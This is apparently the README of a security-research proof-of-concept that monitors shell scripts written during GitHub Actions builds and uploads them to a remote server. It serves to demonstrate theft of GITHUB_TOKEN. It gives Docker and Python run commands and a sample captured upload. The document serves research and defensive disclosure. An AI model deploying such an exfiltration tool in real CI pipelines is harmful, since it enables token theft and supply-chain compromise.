# Github Action Shell Monitor

This python utility can help you to monitor modified shell scripts in a directory. 
Whenever it finds such a script, it also sends it to the designated server.

This utility was used as part of our Github Actions vulnerability research which we wrote about at [Cycode's Blog](https://cycode.com/blog/github-actions-vulnerabilities/).

We presented that research on multiple occasions, like [DevSecCon24](https://www.youtube.com/watch?v=zr4nka52Fk0), [Open Source Summit NA 2022](https://www.youtube.com/watch?v=dTrHKa9mbdQ), and **BSidesBud**.

This tool aims to prove the ability to get the `GITHUB_TOKEN` during Github Actions build for future `run` commands.

This script and other similar POCs are used for research purposes to prove attackers' abilities for similar acts and to help build proper security mitigations.

You can find more information on this tool usage [in this repository](https://github.com/CycodeLabs/gh-injection-vuln-demo).

## Setup

Run a simple server that logs all HTTP requests it receives in your lab environment.
You can use [our public tool](https://github.com/CycodeLabs/simple-http-logger) that does exactly the same.
You can run it through the following command:

```bash
sudo docker run --rm -it -p 8080:8080 cycodelabs/simple-http-logger
```

## How to Run

### Python

```bash
mkdir monitor
python3 action_monitor.py -d monitor -u <URL>
```

### Docker

```bash
sudo docker build -t actionmonitor .
mkdir monitor
sudo docker run --rm -v ${PWD}/monitor:/app/monitored actionmonitor -u <URL>
```

### Docker (from Docker Hub)

```bash
mkdir monitor
sudo docker run --rm -v ${PWD}/monitor:/app/monitored cycodelabs/actionmonitor -u <URL>
```

## Results

Run this on another session

```bash
echo "echo hello" > hello.sh
```

Watch the results on your lab server terminal.

```bash
Host: lab.cycode.com
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 154
Content-Type: multipart/form-data; boundary=e370d0e0927360a399a54b1b2a2758d1

--e370d0e0927360a399a54b1b2a2758d1
Content-Disposition: form-data; name="upload_file"; filename="hello.sh"

echo hello

--e370d0e0927360a399a54b1b2a2758d1--


1.2.3.4 - - [28/Jul/2022 13:13:17] "POST / HTTP/1.1" 200 -
```
